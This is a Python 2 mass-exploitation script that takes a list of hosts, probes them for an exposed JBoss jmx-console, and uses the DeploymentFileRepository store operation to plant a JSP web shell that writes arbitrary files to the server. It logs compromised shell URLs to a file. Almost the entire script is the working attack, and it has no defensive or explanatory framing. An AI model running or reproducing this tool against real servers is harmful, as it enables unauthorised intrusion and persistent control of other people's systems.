#encoding=UTF-8
#author=Doggy
import requests
import threading
import Queue
import re

thread_num=20

class MySpider(threading.Thread):
    headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36'}

    def __init__(self,queue):
        threading.Thread.__init__(self)
        self.queue=queue

    def geturl(self,url):
        try:
            r=requests.get(url=url,headers=self.headers)
            if "Welcome to " in r.text:
                self.getjmx(url)
            elif r.status_code==200 or r.status_code==302:
                self.gettitle(url)

        except:
            pass

    def gettitle(self,url):
        r=requests.get(url=url,headers=self.headers)
        pattern=re.compile("<title>(.*?)</title>",re.S)
        item=re.findall(pattern,r.content)
        with open("jboss-url.txt",'a') as fobj:
            fobj.write(url+"  :  "+item[0].decode('utf-8').encode('gbk')+"\n")


    def getjmx(self,url):
        jmxurl=url+"/jmx-console"
        try:
            r=requests.get(url=jmxurl,headers=self.headers)
            if r.status_code==200:
                self.getshell(url)
        except:
            pass

    def getshell(self,url):
        shellurl=url+"/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=upload5warn.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&argType=boolean&arg4=True"
        shelladdr=url+"/upload5warn/shell.jsp"
        try:
            r=requests.get(url=shellurl,headers=self.headers)
            r1=requests.get(url=shelladdr,headers=self.headers)
            if r.status_code==200 and r1.status_code==200:
                print "[-]getshell successfully"+url
                with open("shell.txt",'a') as fobj:
                    fobj.write(shelladdr+"\n")
            else:
                with open('unshell.txt','a') as fobj:
                    fobj.write("jmx-console exists,but get shell unsuccessfully,you can try to getshell yourself"+"\n")
                    fobj.write(url+"\n")
        except:
            pass
    def run(self):
        while True:
            if self.queue.empty():
                break
            try:
                url="http://"+str(self.queue.get())
                print "[-]testing:"+url
                self.geturl(url)
            except Exception,e:
                print e
queue=Queue.Queue()
threads=[]

with open('url.txt','r') as fobj:
    for eachline in fobj:
        queue.put(eachline.strip())


for i in xrange(thread_num):
    threads.append(MySpider(queue))

for t in threads:
    t.start()

for t in threads:
    t.join()

